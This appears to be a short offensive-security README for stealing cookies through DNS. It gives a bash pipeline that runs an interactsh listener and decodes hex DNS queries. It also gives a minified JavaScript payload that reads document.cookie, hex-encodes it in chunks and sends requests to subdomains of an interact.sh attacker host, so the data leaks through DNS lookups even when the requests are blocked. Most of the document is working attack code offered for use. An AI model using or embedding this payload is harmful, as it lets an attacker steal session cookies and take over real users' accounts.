## Reciever

The following payload will set up a DNS listener (using interactsh by project discovery) and sequentially handle the output to transform the DNS queries containing fragments of cookies (that will be sent by the attacker payload) into readable ASCII characters.

> Note: The dns queries will obey the following pattern: hexacode.yourdomain

#### bash Command

```
interactsh-client | tee -a saida  | tr -d '[]' | cut -f1 -d ' ' | xargs -I@ bash -c 'echo @ | xxd -r -p'
```

## Payload attacker
The payload below will convert all cookies present on the current page into multiple requests (using fetch function from JS), attempting to call your malicious server, which will be listening for DNS queries. 
The trickest and coolest part here is that, if for some reason, the client-side block the GET request from the client-side to be made, with this payload the browser probably has already started a DNS lookup to check if the host provided is alive to be fetched. Then, we can exploit this behavior to gain some advantages. 

#### JS Command

```
t=40;dm='cb364rdve0qv08pghjmgcmdgr5eyyyyyn.interact.sh';k2="-None";d=document;c=d.cookie;function v(dm, d, c){m="";for(var x in c){k=Math.random().toString(36).substring(7);m=m.concat(c.charCodeAt(x).toString(16).padStart(2,0))};iter=[];p=0;x=0;it=(m.length/t);for(i=[];i.length<=it;){i.push(1);iter.push(m.slice(iter.length*t,i.length*t));};for(var o in iter){danger='https://fma6mqp.1wxyg8.sdrv2.fcnoh2'.replace('fma6mqp',iter[o]).replace('1wxyg8',o).replace('sdrv2',k.concat(k2)).replace('fcnoh2',dm);var xhttp = new XMLHttpRequest();xhttp.open("GET", danger);xhttp.send();};};v(dm,d,c)
```

#### Thanks

https://github.com/gum0x/rascal (that JS payload was ~copied~ inspired from here. I've only made some changes)
